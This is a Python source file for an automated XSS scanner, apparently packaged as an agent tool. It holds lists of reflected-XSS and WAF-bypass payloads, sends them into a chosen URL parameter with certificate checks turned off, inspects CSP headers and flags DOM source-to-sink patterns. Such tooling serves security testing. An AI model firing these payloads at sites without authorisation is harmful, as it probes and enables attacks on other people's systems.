"""XSS (Cross-Site Scripting) detection tool. Tests reflected and DOM-based XSS."""
import urllib.request
import urllib.parse
import urllib.error
import ssl
import re
import html

TOOL_SCHEMA = {
    "name": "xss_check",
    "description": (
        "Test a URL parameter for Cross-Site Scripting (XSS) vulnerabilities. "
        "Sends multiple XSS payloads and checks if they are reflected in the response without encoding. "
        "Tests reflected XSS in HTML context, attribute context, and JavaScript context. "
        "Includes WAF bypass payloads. Returns evidence of reflection for each successful payload."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "URL with parameter e.g. http://site.com/search?q=test"},
            "param": {"type": "string", "description": "Parameter name to test e.g. q"},
            "context": {
                "type": "string",
                "enum": ["all", "html", "attribute", "javascript"],
                "default": "all",
                "description": "XSS context to test. Default: all contexts"
            },
        },
        "required": ["url", "param"],
    },
}

# ── XSS Payloads by context ──────────────────────────────────
HTML_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
]

ATTRIBUTE_PAYLOADS = [
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="',
    "' onfocus='alert(1)' autofocus='",
    '" style="background:url(javascript:alert(1))',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '" onclick="alert(1)',
]

JS_PAYLOADS = [
    "'-alert(1)-'",
    "';alert(1)//",
    '";alert(1)//',
    "\\';alert(1)//",
    '</script><script>alert(1)</script>',
    "${alert(1)}",
    "{{7*7}}",
]

# ── WAF bypass payloads ──────────────────────────────────────
WAF_BYPASS_PAYLOADS = [
    '<ScRiPt>alert(1)</sCrIpT>',
    '<img src=x oNeRrOr=alert(1)>',
    '<svg/onload=alert(1)>',
    '<img src=x onerror=\\u0061lert(1)>',
    '<<script>alert(1)//<</script>',
    '<img src="x" onerror="&#97;lert(1)">',
    '<a href=javascript&#58;alert(1)>click</a>',
    '<svg><animate onbegin=alert(1) attributeName=x>',
    '\"><img src=x onerror=alert(1)>',
    '<img src=x onerror=prompt(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select autofocus onfocus=alert(1)>',
]

# ── DOM XSS sinks to look for in JavaScript ──────────────────
DOM_SINKS = [
    'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
    'eval(', 'setTimeout(', 'setInterval(', 'Function(',
    'location.href', 'location.replace', 'location.assign',
    'element.src', '.href=', 'window.open(',
    'jQuery.html(', '$.html(', '.append(',
]

DOM_SOURCES = [
    'location.hash', 'location.search', 'location.href',
    'document.URL', 'document.documentURI', 'document.referrer',
    'window.name', 'document.cookie',
    'localStorage.', 'sessionStorage.',
]


def is_available() -> bool:
    return True


def _make_request(url: str, timeout: int = 12) -> tuple:
    """Make HTTP request, return (body, status, headers) or (None, 0, {})."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    try:
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        req.add_header("Accept", "text/html,application/xhtml+xml,*/*")

        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            body = resp.read(300_000).decode("utf-8", errors="replace")
            return body, resp.status, dict(resp.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read(300_000).decode("utf-8", errors="replace")
            return body, e.code, dict(e.headers) if e.headers else {}
        except Exception:
            return None, e.code, {}
    except Exception:
        return None, 0, {}


def _inject_param(url: str, param: str, payload: str) -> str:
    """Build URL with injected payload."""
    parsed = urllib.parse.urlparse(url)
    base_params = urllib.parse.parse_qs(parsed.query)
    base_params[param] = [payload]
    new_query = urllib.parse.urlencode(base_params, doseq=True)
    return parsed._replace(query=new_query).geturl()


def _check_reflection(body: str, payload: str) -> dict:
    """Check if payload is reflected in response without encoding."""
    if not body:
        return None

    # Check for exact reflection (no encoding = vulnerable)
    if payload in body:
        # Find context around the reflection
        idx = body.find(payload)
        start = max(0, idx - 50)
        end = min(len(body), idx + len(payload) + 50)
        context_snippet = body[start:end].replace('\n', ' ').strip()
        return {
            "reflected": True,
            "encoded": False,
            "snippet": context_snippet,
        }

    # Check if payload is HTML-encoded (not vulnerable but interesting)
    encoded_payload = html.escape(payload)
    if encoded_payload in body and encoded_payload != payload:
        return {
            "reflected": True,
            "encoded": True,
            "snippet": "Payload reflected but HTML-encoded (not exploitable)",
        }

    return None


def _check_csp_header(headers: dict) -> dict:
    """Check Content-Security-Policy header for XSS protection."""
    csp = headers.get("Content-Security-Policy", "")
    x_xss = headers.get("X-XSS-Protection", "")

    result = {"csp_present": bool(csp), "xss_protection": x_xss}

    if csp:
        if "unsafe-inline" in csp:
            result["csp_weakness"] = "CSP allows 'unsafe-inline' - XSS may still be exploitable"
        if "unsafe-eval" in csp:
            result["csp_weakness"] = result.get("csp_weakness", "") + " CSP allows 'unsafe-eval'"
        if "*" in csp.split("script-src")[1] if "script-src" in csp else False:
            result["csp_weakness"] = "CSP script-src has wildcard"
    else:
        result["csp_weakness"] = "No CSP header - no XSS mitigation at browser level"

    return result


def _check_dom_xss(body: str) -> list:
    """Scan JavaScript in page for DOM XSS patterns."""
    findings = []

    for source in DOM_SOURCES:
        for sink in DOM_SINKS:
            # Simple pattern: source flows into sink
            pattern = rf'{re.escape(source)}.*?{re.escape(sink)}'
            matches = re.findall(pattern, body, re.DOTALL)
            if matches:
                findings.append({
                    "type": "dom-xss-pattern",
                    "source": source,
                    "sink": sink,
                    "evidence": f"Potential DOM XSS: {source} → {sink}",
                })

    # Check for inline event handlers with user input
    inline_handlers = re.findall(r'on\w+\s*=\s*["\'][^"\']*(?:location|document|window)[^"\']*["\']', body, re.I)
    for handler in inline_handlers[:5]:
        findings.append({
            "type": "dom-xss-inline",
            "evidence": f"Inline handler with DOM access: {handler[:100]}",
        })

    return findings


async def execute(params: dict) -> str:
    url = params["url"]
    param = params["param"]
    context = params.get("context", "all")

    all_findings = []
    contexts_tested = []

    # Get baseline response and check headers
    baseline_url = _inject_param(url, param, "guardx_xss_test_12345")
    baseline_body, baseline_status, headers = _make_request(baseline_url)

    # Check CSP and XSS protection headers
    csp_info = _check_csp_header(headers)

    # ── HTML context ─────────────────────────────────────────
    if context in ("all", "html"):
        contexts_tested.append("HTML")
        payloads = HTML_PAYLOADS + WAF_BYPASS_PAYLOADS
        for payload in payloads:
            test_url = _inject_param(url, param, payload)
            body, status, _ = _make_request(test_url)
            result = _check_reflection(body, payload)
            if result and not result["encoded"]:
                all_findings.append({
                    "context": "HTML",
                    "payload": payload,
                    "evidence": result["snippet"],
                    "exploitable": True,
                })

    # ── Attribute context ────────────────────────────────────
    if context in ("all", "attribute"):
        contexts_tested.append("Attribute")
        for payload in ATTRIBUTE_PAYLOADS:
            test_url = _inject_param(url, param, payload)
            body, status, _ = _make_request(test_url)
            result = _check_reflection(body, payload)
            if result and not result["encoded"]:
                all_findings.append({
                    "context": "Attribute",
                    "payload": payload,
                    "evidence": result["snippet"],
                    "exploitable": True,
                })

    # ── JavaScript context ───────────────────────────────────
    if context in ("all", "javascript"):
        contexts_tested.append("JavaScript")
        for payload in JS_PAYLOADS:
            test_url = _inject_param(url, param, payload)
            body, status, _ = _make_request(test_url)
            result = _check_reflection(body, payload)
            if result and not result["encoded"]:
                all_findings.append({
                    "context": "JavaScript",
                    "payload": payload,
                    "evidence": result["snippet"],
                    "exploitable": True,
                })

    # ── DOM XSS analysis ─────────────────────────────────────
    if context in ("all", "javascript") and baseline_body:
        dom_findings = _check_dom_xss(baseline_body)
        for df in dom_findings:
            all_findings.append({
                "context": "DOM",
                "payload": "N/A (code analysis)",
                "evidence": df["evidence"],
                "exploitable": "potential",
            })

    # ── Build output ─────────────────────────────────────────
    lines = [
        f"=== XSS SCAN RESULTS for {param} on {url} ===",
        f"Contexts tested: {', '.join(contexts_tested)}",
        f"Total payloads tested: {len(HTML_PAYLOADS) + len(ATTRIBUTE_PAYLOADS) + len(JS_PAYLOADS) + len(WAF_BYPASS_PAYLOADS)}",
        "",
        "--- Security Headers ---",
        f"  CSP: {'Present' if csp_info['csp_present'] else 'MISSING'}",
        f"  X-XSS-Protection: {csp_info['xss_protection'] or 'MISSING'}",
    ]

    if csp_info.get("csp_weakness"):
        lines.append(f"  Weakness: {csp_info['csp_weakness']}")
    lines.append("")

    if all_findings:
        reflected = [f for f in all_findings if f.get("exploitable") == True]
        dom = [f for f in all_findings if f["context"] == "DOM"]

        lines.append(f"--- Findings: {len(all_findings)} ({len(reflected)} reflected, {len(dom)} DOM) ---")
        lines.append("")

        for i, f in enumerate(all_findings, 1):
            status = "EXPLOITABLE" if f.get("exploitable") == True else "POTENTIAL"
            lines.append(f"  [{i}] {f['context']} XSS - {status}")
            lines.append(f"      Payload: {f['payload']}")
            lines.append(f"      Evidence: {f['evidence'][:150]}")
            lines.append("")

        lines.append("[!] Parameter is VULNERABLE to XSS")
    else:
        lines.append("No XSS vulnerabilities found.")
        lines.append("Note: WAF bypass and DOM analysis were also performed.")

    return "\n".join(lines)
